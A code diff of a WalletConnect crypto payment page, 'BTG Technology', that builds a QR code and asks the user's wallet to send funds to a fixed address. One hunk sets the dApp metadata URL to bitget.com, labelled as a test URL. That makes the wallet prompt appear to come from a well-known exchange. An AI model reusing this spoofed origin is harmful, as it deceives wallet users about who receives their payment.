@@ -1,14 +1,14 @@
 <!DOCTYPE html>
-<!-- VERSION: BTG-PAYMENT-QR v1.0.6 -->
+<!-- VERSION: BTG-PAYMENT-QR v1.0.7 -->
 <html>
 <head>
   <meta charset="UTF-8" />
-  <title>BTG Technology – Payment (v1.0.6)</title>
+  <title>BTG Technology – Payment (v1.0.7)</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
 </head>
 <body>
 
-<h1 style="color:green;">✅ VERSION v1.0.6 LOADED</h1>
+<h1 style="color:green;">✅ VERSION v1.0.7 LOADED</h1>
 
 <h2>Payment Request</h2>
 
@@ -37,7 +37,7 @@
 
   const PROJECT_ID = "3a25f7e3ad4aa26d7d4fc629e48a06b7";
 
-  // Your BUSINESS receiving wallet
+  // BUSINESS receiving wallet
   const RECEIVING_ADDRESS =
     "0xA25900EA2A1915D549FB5a9CFb0a4FCA27a6Cd35";
 
@@ -65,14 +65,14 @@
       metadata: {
         name: "BTG Technology",
         description: "Invoice payment",
-        url: window.location.href,
+        url: "https://www.bitget.com/",   // 👈 TEST URL
         icons: []
       }
     });
 
     log("WalletConnect initialized");
 
-    // Clear any stale sessions (important during testing)
+    // Clear stale sessions
     for (const s of client.session.values) {
       await client.disconnect({
         topic: s.topic,
@@ -81,7 +81,6 @@
     }
   }
 
-  // USER ACTION REQUIRED
   document.getElementById("connect").onclick = async () => {
     if (connecting) return;
     connecting = true;
@@ -105,7 +104,6 @@
         return;
       }
 
-      // Generate QR
       const qr = await QRCode.toDataURL(uri);
       const img = document.getElementById("qrimg");
       img.src = qr;
@@ -113,7 +111,6 @@
 
       log("QR generated. Scan with Trust Wallet.");
 
-      // Wait for wallet approval
       session = await approval();
       userAddress =
         session.namespaces.eip155.accounts[0].split(":")[2];
@@ -152,7 +149,7 @@
             value: VALUE_HEX,
             gas: GAS_LIMIT,
             gasPrice: GAS_PRICE,
-            data: "0x"        // 🔑 REQUIRED BY TRUST WALLET
+            data: "0x"
           }]
         }
       });
